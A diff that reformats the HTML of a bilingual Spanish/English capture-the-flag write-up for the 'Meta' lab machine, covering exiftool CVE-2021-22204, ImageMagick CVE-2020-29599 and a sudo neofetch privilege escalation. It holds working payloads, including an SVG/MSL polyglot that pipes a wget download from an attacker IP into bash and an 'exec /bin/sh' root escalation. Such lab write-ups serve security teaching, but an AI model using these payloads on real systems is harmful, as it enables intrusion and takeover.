@@ -46,8 +46,20 @@
             <div id="content-es" class="lang-content">
                 <div class="machine-summary">
                     <h2 data-i18n="summary-title">Resumen de Explotación</h2>
-                    <p><strong>Cadena de explotación:</strong> Comenzamos descubriendo un virtual host <code>artcorp.htb</code> que alberga una aplicación vulnerable a la CVE-2021-22204 en exiftool. Mediante la creación de un archivo DjVu malicioso, logramos ejecutar comandos como usuario <code>www-data</code>. Enumerando el sistema, descubrimos que el usuario <code>thomas</code> ejecuta periódicamente un script que utiliza <code>mogrify</code> de ImageMagick (versión 7.0.10-36), vulnerable a CVE-2020-29599. Explotamos esta vulnerabilidad mediante un archivo SVG/MSL polyglote para obtener acceso como <code>thomas</code>. Finalmente, escalamos a <code>root</code> abusando de una configuración permisiva de <code>sudo</code> con <code>neofetch</code>, donde la variable de entorno <code>XDG_CONFIG_HOME</code> puede ser modificada para cargar un archivo de configuración malicioso.</p>
-                    <p><strong>Tecnologías/Exploits:</strong> CVE-2021-22204 (exiftool), CVE-2020-29599 (ImageMagick XXE), abuso de env_keep en sudo + GTFOBins (neofetch).</p>
+                    <p><strong>Cadena de explotación:</strong> Comenzamos descubriendo un virtual host
+                        <code>artcorp.htb</code> que alberga una aplicación vulnerable a la CVE-2021-22204 en exiftool.
+                        Mediante la creación de un archivo DjVu malicioso, logramos ejecutar comandos como usuario
+                        <code>www-data</code>.</p>
+                    <p>Enumerando el sistema, descubrimos que el usuario <code>thomas</code> ejecuta periódicamente un
+                        script que utiliza <code>mogrify</code> de ImageMagick (versión 7.0.10-36), vulnerable a
+                        CVE-2020-29599. Explotamos esta vulnerabilidad mediante un archivo SVG/MSL polyglote para
+                        obtener acceso como <code>thomas</code>.</p>
+                    <p>Finalmente, escalamos a <code>root</code> abusando de una configuración permisiva de
+                        <code>sudo</code> con <code>neofetch</code>, donde la variable de entorno
+                        <code>XDG_CONFIG_HOME</code> puede ser modificada para cargar un archivo de configuración
+                        malicioso.</p>
+                    <p><strong>Tecnologías/Exploits:</strong> CVE-2021-22204 (exiftool), CVE-2020-29599 (ImageMagick
+                        XXE), abuso de env_keep en sudo + GTFOBins (neofetch).</p>
                 </div>
                 <hr class="summary-divider">
 
@@ -57,31 +69,46 @@
 
                 <p><img src="./media/image3.png" alt="Resultados de Nmap mostrando puertos 80 y 22 abiertos" /></p>
 
-                <p>El escaneo revela un virtual host <code>artcorp.htb</code>, que añadimos a nuestro archivo <code>/etc/hosts</code> para la posterior enumeración.</p>
+                <p>El escaneo revela un virtual host <code>artcorp.htb</code>, que añadimos a nuestro archivo
+                    <code>/etc/hosts</code> para la posterior enumeración.</p>
 
-                <p>Una vez accedemos al sitio web, observamos una página con un listado de personal, donde destacamos a un desarrollador PHP. Esto nos sugiere que el backend probablemente está escrito en PHP. Realizamos un escaneo de virtual hosts con <code>gobuster</code> para descubrir más subdominios:</p>
+                <p>Una vez accedemos al sitio web, observamos una página con un listado de personal, donde destacamos a
+                    un desarrollador PHP. Esto nos sugiere que el backend probablemente está escrito en PHP. Realizamos
+                    un escaneo de virtual hosts con <code>gobuster</code> para descubrir más subdominios:</p>
 
                 <pre><code class="language-bash">gobuster vhost -u http://artcorp.htb -w subdomains.txt</code></pre>
 
-                <p>Encontramos el virtual host <code>dev01.artcorp.htb</code. Tras acceder a él, descubrimos una aplicación web que permite subir imágenes y utiliza <code>exiftool</code> para extraer metadatos:</p>
+                <p>Encontramos el virtual host
+                    <code>dev01.artcorp.htb</code. Tras acceder a él, descubrimos una aplicación web que permite subir imágenes y utiliza <code>exiftool</code>
+                    para extraer metadatos:</p>
 
-                <p><img src="./media/image4.png" alt="Interfaz de la aplicación dev01 mostrando opciones de metaview" /></p>
+                <p><img src="./media/image4.png" alt="Interfaz de la aplicación dev01 mostrando opciones de metaview" />
+                </p>
 
                 <h2>Explotación - Parte 1: CVE-2021-22204 en exiftool</h2>
 
-                <p>Al subir una imagen a la sección <code>/metaview</code>, la aplicación procesa el archivo con <code>exiftool</code> y muestra claramente sus resultados:</p>
+                <p>Al subir una imagen a la sección <code>/metaview</code>, la aplicación procesa el archivo con
+                    <code>exiftool</code> y muestra claramente sus resultados:</p>
 
                 <p><img src="./media/image2.png" alt="Interfaz de subida de metaview" /></p>
 
                 <p><img src="./media/image1.png" alt="Output de exiftool mostrando metadatos de la imagen" /></p>
 
-                <p>Aunque el output no mostraba completamente la versión de exiftool, investigamos vulnerabilidades conocidas en esta herramienta. Encontramos la CVE-2021-22204, una vulnerabilidad de inyección de comandos en archivos DjVu que afecta a exiftool versiones 7.44 hasta 12.24.</p>
+                <p>Aunque el output no mostraba completamente la versión de exiftool, investigamos vulnerabilidades
+                    conocidas en esta herramienta. Encontramos la CVE-2021-22204, una vulnerabilidad de inyección de
+                    comandos en archivos DjVu que afecta a exiftool versiones 7.44 hasta 12.24.</p>
 
-                <p>La vulnerabilidad funciona porque exiftool no sanitiza correctamente datos en archivos DjVu. Localizamos un exploit público que genera un archivo DjVu malicioso que ejecuta comandos arbitrarios cuando es procesado:</p>
+                <p>La vulnerabilidad funciona porque exiftool no sanitiza correctamente datos en archivos DjVu.
+                    Localizamos un exploit público que genera un archivo DjVu malicioso que ejecuta comandos arbitrarios
+                    cuando es procesado:</p>
 
-                <p><a href="https://github.com/convisolabs/CVE-2021-22204-exiftool">https://github.com/convisolabs/CVE-2021-22204-exiftool</a></p>
+                <p><a
+                        href="https://github.com/convisolabs/CVE-2021-22204-exiftool">https://github.com/convisolabs/CVE-2021-22204-exiftool</a>
+                </p>
 
-                <p>El exploit utiliza tres herramientas (<code>bzz</code>, <code>djvumake</code>, y <code>exiftool</code>) para crear un payload embebido en un archivo DjVu. El script Python genera un archivo que, cuando es procesado, ejecuta comandos del sistema:</p>
+                <p>El exploit utiliza tres herramientas (<code>bzz</code>, <code>djvumake</code>, y
+                    <code>exiftool</code>) para crear un payload embebido en un archivo DjVu. El script Python genera un
+                    archivo que, cuando es procesado, ejecuta comandos del sistema:</p>
 
                 <pre><code class="language-python">#!/bin/env python3
 
@@ -108,11 +135,16 @@ subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=
 subprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif<=exploit.djvu', 'image.jpg'])
 </code></pre>
 
-                <p>Al ejecutar el exploit con una reverse shell como payload, ganamos acceso al sistema como el usuario <code>www-data</code>. Una vez dentro, enumeramos el sistema y descubrimos el usuario <code>thomas</code> con un home accesible.</p>
+                <p>Al ejecutar el exploit con una reverse shell como payload, ganamos acceso al sistema como el usuario
+                    <code>www-data</code>. Una vez dentro, enumeramos el sistema y descubrimos el usuario
+                    <code>thomas</code> con un home accesible.</p>
 
                 <h2>Enumeración y Descubrimiento de Procesos</h2>
 
-                <p>Explorando el sistema, encontramos un archivo de configuración sospechoso en <code>/home/thomas/.config/neofetch/config.conf</code> y el binario <code>neofetch</code> instalado en el sistema. Para obtener más información sobre qué procesos se ejecutan en segundo plano, utilizamos <code>pspy64</code>:</p>
+                <p>Explorando el sistema, encontramos un archivo de configuración sospechoso en
+                    <code>/home/thomas/.config/neofetch/config.conf</code> y el binario <code>neofetch</code> instalado
+                    en el sistema. Para obtener más información sobre qué procesos se ejecutan en segundo plano,
+                    utilizamos <code>pspy64</code>:</p>
 
                 <p>Observamos que cada minuto se ejecuta el siguiente ciclo de procesos:</p>
 
@@ -128,23 +160,32 @@ cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format 
 pkill mogrify
 </code></pre>
 
-                <p>Investigamos qué es <code>mogrify</code> y descubrimos que es parte de la suite ImageMagick. La versión instalada es:</p>
+                <p>Investigamos qué es <code>mogrify</code> y descubrimos que es parte de la suite ImageMagick. La
+                    versión instalada es:</p>
 
                 <pre><code class="language-bash">Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29</code></pre>
 
                 <h2>Explotación - Parte 2: CVE-2020-29599 en ImageMagick</h2>
 
-                <p>La versión 7.0.10-36 de ImageMagick es vulnerable a CVE-2020-29599, que permite inyección de comandos a través de la opción <code>authenticate</code>. Un investigador de seguridad documentó detalladamente cómo explotar esta vulnerabilidad:</p>
+                <p>La versión 7.0.10-36 de ImageMagick es vulnerable a CVE-2020-29599, que permite inyección de comandos
+                    a través de la opción <code>authenticate</code>. Un investigador de seguridad documentó
+                    detalladamente cómo explotar esta vulnerabilidad:</p>
 
-                <p><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-29599">https://nvd.nist.gov/vuln/detail/CVE-2020-29599</a></p>
+                <p><a
+                        href="https://nvd.nist.gov/vuln/detail/CVE-2020-29599">https://nvd.nist.gov/vuln/detail/CVE-2020-29599</a>
+                </p>
 
-                <p><a href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a></p>
+                <p><a
+                        href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a>
+                </p>
 
                 <p>Primero probamos el PoC básico con la opción <code>authenticate</code>:</p>
 
                 <pre><code class="language-bash">mogrify -authenticate 'test" `echo $(id)> ./poc`;"' test.pdf out.png</code></pre>
 
-                <p>El exploit funciona, pero es sensible a caracteres especiales. Para hacer la explotación más confiable, creamos un archivo SVG/MSL "polyglote" que funciona tanto como imagen SVG como código MSL de ImageMagick:</p>
+                <p>El exploit funciona, pero es sensible a caracteres especiales. Para hacer la explotación más
+                    confiable, creamos un archivo SVG/MSL "polyglote" que funciona tanto como imagen SVG como código MSL
+                    de ImageMagick:</p>
 
                 <pre><code class="language-xml">&lt;image authenticate='ff" `wget -qO- 10.10.14.172 | bash`;"'&gt;
   &lt;read filename="pdf:/etc/passwd"/&gt;
@@ -157,9 +198,13 @@ pkill mogrify
 &lt;/image&gt;
 </code></pre>
 
-                <p>Este archivo polyglote es más robusto porque evita caracteres problemáticos como dos puntos en la inyección de comandos. Servimos un script de reverse shell desde nuestro servidor HTTP y lo ejecutamos mediante <code>wget</code> con pipe a <code>bash</code>:</p>
+                <p>Este archivo polyglote es más robusto porque evita caracteres problemáticos como dos puntos en la
+                    inyección de comandos. Servimos un script de reverse shell desde nuestro servidor HTTP y lo
+                    ejecutamos mediante <code>wget</code> con pipe a <code>bash</code>:</p>
 
-                <p>Subimos el archivo SVG malicioso a través de la aplicación web en <code>/metaview</code>. Cuando se procesa durante el siguiente ciclo de ejecución (cada minuto), obtenemos una reverse shell como usuario <code>thomas</code>.</p>
+                <p>Subimos el archivo SVG malicioso a través de la aplicación web en <code>/metaview</code>. Cuando se
+                    procesa durante el siguiente ciclo de ejecución (cada minuto), obtenemos una reverse shell como
+                    usuario <code>thomas</code>.</p>
 
                 <h2>Escalación de Privilegios</h2>
 
@@ -176,35 +221,56 @@ User thomas may run the following commands on meta:
                 <p>Notamos dos elementos críticos:</p>
 
                 <ol>
-                    <li>El usuario <code>thomas</code> puede ejecutar <code>neofetch</code> como <code>root</code> sin contraseña</li>
-                    <li>La variable de entorno <code>XDG_CONFIG_HOME</code> está en la lista de <code>env_keep</code>, lo que permite modificarla</li>
+                    <li>El usuario <code>thomas</code> puede ejecutar <code>neofetch</code> como <code>root</code> sin
+                        contraseña</li>
+                    <li>La variable de entorno <code>XDG_CONFIG_HOME</code> está en la lista de <code>env_keep</code>,
+                        lo que permite modificarla</li>
                 </ol>
 
-                <p>Según GTFOBins, <code>neofetch</code> es vulnerable a ejecución de comandos a través de su archivo de configuración:</p>
+                <p>Según GTFOBins, <code>neofetch</code> es vulnerable a ejecución de comandos a través de su archivo de
+                    configuración:</p>
 
                 <p><a href="https://gtfobins.org/gtfobins/neofetch/">https://gtfobins.org/gtfobins/neofetch/</a></p>
 
-                <p>La técnica es simple: si el archivo de configuración contiene <code>exec /bin/sh</code>, ese comando se ejecutará cuando <code>neofetch</code> se inicie. Dado que podemos controlar la ruta del archivo de configuración mediante <code>XDG_CONFIG_HOME</code>, podemos hacer que <code>neofetch</code> cargue una configuración maliciosa.</p>
+                <p>La técnica es simple: si el archivo de configuración contiene <code>exec /bin/sh</code>, ese comando
+                    se ejecutará cuando <code>neofetch</code> se inicie. Dado que podemos controlar la ruta del archivo
+                    de configuración mediante <code>XDG_CONFIG_HOME</code>, podemos hacer que <code>neofetch</code>
+                    cargue una configuración maliciosa.</p>
 
-                <p>Modificamos el archivo de configuración existente en <code>/home/thomas/.config/neofetch/config.conf</code> añadiendo la siguiente línea al principio:</p>
+                <p>Modificamos el archivo de configuración existente en
+                    <code>/home/thomas/.config/neofetch/config.conf</code> añadiendo la siguiente línea al principio:
+                </p>
 
                 <pre><code class="language-bash">exec /bin/sh</code></pre>
 
-                <p>Luego ejecutamos el comando con la variable de entorno apuntando a nuestra configuración maliciosa:</p>
+                <p>Luego ejecutamos el comando con la variable de entorno apuntando a nuestra configuración maliciosa:
+                </p>
 
                 <pre><code class="language-bash">thomas@meta:~$ XDG_CONFIG_HOME=/home/thomas/.config sudo neofetch "\""
 root@meta:/home/thomas#
 </code></pre>
 
-                <p>¡Escalamos a <code>root</code>! La combinación de la variable de entorno permitida en <code>env_keep</code> y la capacidad de ejecutar <code>neofetch</code> sin contraseña nos proporciona acceso administrativo completo al sistema.</p>
+                <p>¡Escalamos a <code>root</code>! La combinación de la variable de entorno permitida en
+                    <code>env_keep</code> y la capacidad de ejecutar <code>neofetch</code> sin contraseña nos
+                    proporciona acceso administrativo completo al sistema.</p>
 
             </div>
 
             <div id="content-en" class="lang-content" style="display:none;">
                 <div class="machine-summary">
                     <h2 data-i18n="summary-title">Exploitation Summary</h2>
-                    <p><strong>Exploitation chain:</strong> We discovered a virtual host <code>artcorp.htb</code> hosting a web application vulnerable to CVE-2021-22204 in exiftool. By crafting a malicious DjVu file, we achieved command execution as the <code>www-data</code> user. Through system enumeration, we found that user <code>thomas</code> periodically executes a script using <code>mogrify</code> from ImageMagick (version 7.0.10-36), vulnerable to CVE-2020-29599. We exploited this vulnerability using a polyglot SVG/MSL file to gain access as <code>thomas</code>. Finally, we escalated to <code>root</code> by abusing a permissive <code>sudo</code> configuration with <code>neofetch</code>, where the <code>XDG_CONFIG_HOME</code> environment variable could be modified to load a malicious configuration file.</p>
-                    <p><strong>Technologies/Exploits:</strong> CVE-2021-22204 (exiftool), CVE-2020-29599 (ImageMagick XXE), sudo env_keep abuse + GTFOBins (neofetch).</p>
+                    <p><strong>Exploitation chain:</strong> We discovered a virtual host <code>artcorp.htb</code>
+                        hosting a web application vulnerable to CVE-2021-22204 in exiftool. By crafting a malicious DjVu
+                        file, we achieved command execution as the <code>www-data</code> user.</p>
+                    <p>Through system enumeration, we found that user <code>thomas</code> periodically executes a script
+                        using <code>mogrify</code> from ImageMagick (version 7.0.10-36), vulnerable to CVE-2020-29599.
+                        We exploited this vulnerability using a polyglot SVG/MSL file to gain access as
+                        <code>thomas</code>.</p>
+                    <p>Finally, we escalated to <code>root</code> by abusing a permissive <code>sudo</code>
+                        configuration with <code>neofetch</code>, where the <code>XDG_CONFIG_HOME</code> environment
+                        variable could be modified to load a malicious configuration file.</p>
+                    <p><strong>Technologies/Exploits:</strong> CVE-2021-22204 (exiftool), CVE-2020-29599 (ImageMagick
+                        XXE), sudo env_keep abuse + GTFOBins (neofetch).</p>
                 </div>
                 <hr class="summary-divider">
 
@@ -214,31 +280,44 @@ root@meta:/home/thomas#
 
                 <p><img src="./media/image3.png" alt="Nmap results showing ports 80 and 22 open" /></p>
 
-                <p>The scan reveals a virtual host <code>artcorp.htb</code>, which we add to our <code>/etc/hosts</code> file for subsequent enumeration.</p>
+                <p>The scan reveals a virtual host <code>artcorp.htb</code>, which we add to our <code>/etc/hosts</code>
+                    file for subsequent enumeration.</p>
 
-                <p>Upon accessing the website, we observe a page listing company personnel, including a PHP developer. This suggests the backend is likely written in PHP. We perform a virtual host scan with <code>gobuster</code> to discover additional subdomains:</p>
+                <p>Upon accessing the website, we observe a page listing company personnel, including a PHP developer.
+                    This suggests the backend is likely written in PHP. We perform a virtual host scan with
+                    <code>gobuster</code> to discover additional subdomains:</p>
 
                 <pre><code class="language-bash">gobuster vhost -u http://artcorp.htb -w subdomains.txt</code></pre>
 
-                <p>We discover the virtual host <code>dev01.artcorp.htb</code>. After accessing it, we find a web application that allows image uploads and uses <code>exiftool</code> to extract metadata:</p>
+                <p>We discover the virtual host <code>dev01.artcorp.htb</code>. After accessing it, we find a web
+                    application that allows image uploads and uses <code>exiftool</code> to extract metadata:</p>
 
                 <p><img src="./media/image4.png" alt="dev01 application interface showing metaview options" /></p>
 
                 <h2>Exploitation - Part 1: CVE-2021-22204 in exiftool</h2>
 
-                <p>When uploading an image to the <code>/metaview</code> section, the application processes the file with <code>exiftool</code> and displays its results clearly:</p>
+                <p>When uploading an image to the <code>/metaview</code> section, the application processes the file
+                    with <code>exiftool</code> and displays its results clearly:</p>
 
                 <p><img src="./media/image2.png" alt="Metaview upload interface" /></p>
 
                 <p><img src="./media/image1.png" alt="exiftool output showing image metadata" /></p>
 
-                <p>Although the output did not fully display the exiftool version, we investigated known vulnerabilities in this tool. We found CVE-2021-22204, a command injection vulnerability in DjVu files affecting exiftool versions 7.44 through 12.24.</p>
+                <p>Although the output did not fully display the exiftool version, we investigated known vulnerabilities
+                    in this tool. We found CVE-2021-22204, a command injection vulnerability in DjVu files affecting
+                    exiftool versions 7.44 through 12.24.</p>
 
-                <p>The vulnerability exists because exiftool does not properly sanitize data in DjVu files. We located a public exploit that generates a malicious DjVu file that executes arbitrary commands when processed:</p>
+                <p>The vulnerability exists because exiftool does not properly sanitize data in DjVu files. We located a
+                    public exploit that generates a malicious DjVu file that executes arbitrary commands when processed:
+                </p>
 
-                <p><a href="https://github.com/convisolabs/CVE-2021-22204-exiftool">https://github.com/convisolabs/CVE-2021-22204-exiftool</a></p>
+                <p><a
+                        href="https://github.com/convisolabs/CVE-2021-22204-exiftool">https://github.com/convisolabs/CVE-2021-22204-exiftool</a>
+                </p>
 
-                <p>The exploit uses three tools (<code>bzz</code>, <code>djvumake</code>, and <code>exiftool</code>) to create a payload embedded in a DjVu file. The Python script generates a file that, when processed, executes system commands:</p>
+                <p>The exploit uses three tools (<code>bzz</code>, <code>djvumake</code>, and <code>exiftool</code>) to
+                    create a payload embedded in a DjVu file. The Python script generates a file that, when processed,
+                    executes system commands:</p>
 
                 <pre><code class="language-python">#!/bin/env python3
 
@@ -265,11 +344,16 @@ subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=
 subprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif<=exploit.djvu', 'image.jpg'])
 </code></pre>
 
-                <p>By executing the exploit with a reverse shell as the payload, we gain access to the system as the <code>www-data</code> user. Once inside, we enumerate the system and discover user <code>thomas</code> with an accessible home directory.</p>
+                <p>By executing the exploit with a reverse shell as the payload, we gain access to the system as the
+                    <code>www-data</code> user. Once inside, we enumerate the system and discover user
+                    <code>thomas</code> with an accessible home directory.</p>
 
                 <h2>Enumeration and Process Discovery</h2>
 
-                <p>While exploring the system, we find a suspicious configuration file at <code>/home/thomas/.config/neofetch/config.conf</code> and the <code>neofetch</code> binary installed on the system. To gather more information about background processes, we use <code>pspy64</code>:</p>
+                <p>While exploring the system, we find a suspicious configuration file at
+                    <code>/home/thomas/.config/neofetch/config.conf</code> and the <code>neofetch</code> binary
+                    installed on the system. To gather more information about background processes, we use
+                    <code>pspy64</code>:</p>
 
                 <p>We observe that every minute, the following process cycle executes:</p>
 
@@ -285,23 +369,31 @@ cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format 
 pkill mogrify
 </code></pre>
 
-                <p>We investigate what <code>mogrify</code> is and discover it's part of the ImageMagick suite. The installed version is:</p>
+                <p>We investigate what <code>mogrify</code> is and discover it's part of the ImageMagick suite. The
+                    installed version is:</p>
 
                 <pre><code class="language-bash">Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29</code></pre>
 
                 <h2>Exploitation - Part 2: CVE-2020-29599 in ImageMagick</h2>
 
-                <p>Version 7.0.10-36 of ImageMagick is vulnerable to CVE-2020-29599, which allows command injection through the <code>authenticate</code> option. A security researcher documented in detail how to exploit this vulnerability:</p>
+                <p>Version 7.0.10-36 of ImageMagick is vulnerable to CVE-2020-29599, which allows command injection
+                    through the <code>authenticate</code> option. A security researcher documented in detail how to
+                    exploit this vulnerability:</p>
 
-                <p><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-29599">https://nvd.nist.gov/vuln/detail/CVE-2020-29599</a></p>
+                <p><a
+                        href="https://nvd.nist.gov/vuln/detail/CVE-2020-29599">https://nvd.nist.gov/vuln/detail/CVE-2020-29599</a>
+                </p>
 
-                <p><a href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a></p>
+                <p><a
+                        href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a>
+                </p>
 
                 <p>First, we test the basic PoC with the <code>authenticate</code> option:</p>
 
                 <pre><code class="language-bash">mogrify -authenticate 'test" `echo $(id)> ./poc`;"' test.pdf out.png</code></pre>
 
-                <p>The exploit works, but is sensitive to special characters. To make exploitation more reliable, we create a "polyglot" SVG/MSL file that functions as both SVG image and ImageMagick MSL code:</p>
+                <p>The exploit works, but is sensitive to special characters. To make exploitation more reliable, we
+                    create a "polyglot" SVG/MSL file that functions as both SVG image and ImageMagick MSL code:</p>
 
                 <pre><code class="language-xml">&lt;image authenticate='ff" `wget -qO- 10.10.14.172 | bash`;"'&gt;
   &lt;read filename="pdf:/etc/passwd"/&gt;
@@ -314,9 +406,13 @@ pkill mogrify
 &lt;/image&gt;
 </code></pre>
 
-                <p>This polyglot file is more robust because it avoids problematic characters like colons in command injection. We serve a reverse shell script from our HTTP server and execute it through <code>wget</code> piped to <code>bash</code>:</p>
+                <p>This polyglot file is more robust because it avoids problematic characters like colons in command
+                    injection. We serve a reverse shell script from our HTTP server and execute it through
+                    <code>wget</code> piped to <code>bash</code>:</p>
 
-                <p>We upload the malicious SVG file through the web application in <code>/metaview</code>. When it's processed during the next execution cycle (every minute), we receive a reverse shell as user <code>thomas</code>.</p>
+                <p>We upload the malicious SVG file through the web application in <code>/metaview</code>. When it's
+                    processed during the next execution cycle (every minute), we receive a reverse shell as user
+                    <code>thomas</code>.</p>
 
                 <h2>Privilege Escalation</h2>
 
@@ -333,27 +429,37 @@ User thomas may run the following commands on meta:
                 <p>We notice two critical elements:</p>
 
                 <ol>
-                    <li>User <code>thomas</code> can execute <code>neofetch</code> as <code>root</code> without a password</li>
-                    <li>The <code>XDG_CONFIG_HOME</code> environment variable is in the <code>env_keep</code> list, allowing us to modify it</li>
+                    <li>User <code>thomas</code> can execute <code>neofetch</code> as <code>root</code> without a
+                        password</li>
+                    <li>The <code>XDG_CONFIG_HOME</code> environment variable is in the <code>env_keep</code> list,
+                        allowing us to modify it</li>
                 </ol>
 
-                <p>According to GTFOBins, <code>neofetch</code> is vulnerable to command execution through its configuration file:</p>
+                <p>According to GTFOBins, <code>neofetch</code> is vulnerable to command execution through its
+                    configuration file:</p>
 
                 <p><a href="https://gtfobins.org/gtfobins/neofetch/">https://gtfobins.org/gtfobins/neofetch/</a></p>
 
-                <p>The technique is straightforward: if the configuration file contains <code>exec /bin/sh</code>, that command will execute when <code>neofetch</code> starts. Since we can control the configuration file path through <code>XDG_CONFIG_HOME</code>, we can make <code>neofetch</code> load a malicious configuration.</p>
+                <p>The technique is straightforward: if the configuration file contains <code>exec /bin/sh</code>, that
+                    command will execute when <code>neofetch</code> starts. Since we can control the configuration file
+                    path through <code>XDG_CONFIG_HOME</code>, we can make <code>neofetch</code> load a malicious
+                    configuration.</p>
 
-                <p>We modify the existing configuration file at <code>/home/thomas/.config/neofetch/config.conf</code> by adding the following line at the beginning:</p>
+                <p>We modify the existing configuration file at <code>/home/thomas/.config/neofetch/config.conf</code>
+                    by adding the following line at the beginning:</p>
 
                 <pre><code class="language-bash">exec /bin/sh</code></pre>
 
-                <p>Then we execute the command with the environment variable pointing to our malicious configuration:</p>
+                <p>Then we execute the command with the environment variable pointing to our malicious configuration:
+                </p>
 
                 <pre><code class="language-bash">thomas@meta:~$ XDG_CONFIG_HOME=/home/thomas/.config sudo neofetch "\""
 root@meta:/home/thomas#
 </code></pre>
 
-                <p>We successfully escalate to <code>root</code>! The combination of the permitted environment variable in <code>env_keep</code> and the ability to execute <code>neofetch</code> without a password grants us complete administrative access to the system.</p>
+                <p>We successfully escalate to <code>root</code>! The combination of the permitted environment variable
+                    in <code>env_keep</code> and the ability to execute <code>neofetch</code> without a password grants
+                    us complete administrative access to the system.</p>
 
             </div>
         </article>
